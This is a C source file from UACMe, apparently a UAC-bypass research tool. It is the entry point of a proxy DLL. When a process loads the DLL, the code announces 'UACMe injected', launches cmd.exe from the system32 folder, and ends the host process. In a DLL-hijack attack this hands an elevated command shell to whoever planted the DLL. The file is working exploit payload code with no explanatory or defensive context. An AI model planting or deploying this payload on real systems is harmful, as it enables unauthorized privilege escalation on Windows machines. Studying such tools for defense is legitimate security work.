/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     1.00
*
*  DATE:        10 Mar 2015
*
*  Proxy dll entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <windows.h>

VOID WINAPI DummyFunc(
	VOID
	)
{
}

BOOL WINAPI DllMain(
	__in  HINSTANCE hinstDLL,
	__in  DWORD fdwReason,
	__in  LPVOID lpvReserved
	)
{
	DWORD					cch;
	TCHAR					cmdbuf[MAX_PATH + 1], sysdir[MAX_PATH + 1];
	STARTUPINFO				startupInfo;
	PROCESS_INFORMATION		processInfo;

	UNREFERENCED_PARAMETER(hinstDLL);
	UNREFERENCED_PARAMETER(lpvReserved);

	if (fdwReason == DLL_PROCESS_ATTACH) {
		OutputDebugString(TEXT("UACMe injected\r\n"));

		RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
		RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
		startupInfo.cb = sizeof(startupInfo);
		GetStartupInfo(&startupInfo);

		RtlSecureZeroMemory(sysdir, sizeof(sysdir));
		cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
		if ((cch != 0) && (cch < MAX_PATH)) {
			RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
			lstrcpy(cmdbuf, sysdir);
			lstrcat(cmdbuf, TEXT("cmd.exe"));

			if (CreateProcess(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
				sysdir, &startupInfo, &processInfo))
			{
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
		}
		ExitProcess(0);
	}
	return TRUE;
}
